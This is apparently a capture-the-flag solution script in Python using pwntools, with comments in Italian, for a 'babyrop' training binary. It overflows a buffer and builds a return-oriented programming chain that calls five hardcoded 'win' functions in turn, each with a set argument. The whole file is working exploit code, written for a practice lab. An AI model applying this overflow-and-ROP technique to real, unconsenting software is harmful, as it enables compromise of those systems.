from pwn import * 

elf = ELF("/challenge/babyrop_level3.1")
io = elf.process()

# Ognu funzione vuole un parametro (da 1 a 5 per 1 a 5)
win_add1 = p64(int("4020e8", 16))
win_add2 = p64(int("4021c4", 16))
win_add3 = p64(int("40238a", 16))
win_add4 = p64(int("4022a4", 16))
win_add5 = p64(int("402005", 16))

buff_offset = int("38", 16)

# Devo trovare i gadget
rop = ROP("/challenge/babyrop_level3.1")

pop_rdi = rop.rdi.address

p = b'A'*buff_offset + \
    p64(pop_rdi) + p64(1) + win_add1 +\
        p64(pop_rdi) + p64(2) + win_add2 +\
            p64(pop_rdi) + p64(3) + win_add3 +\
                p64(pop_rdi) + p64(4) + win_add4 +\
                    p64(pop_rdi) + p64(5) + win_add5

io.sendline(p)

io.interactive()
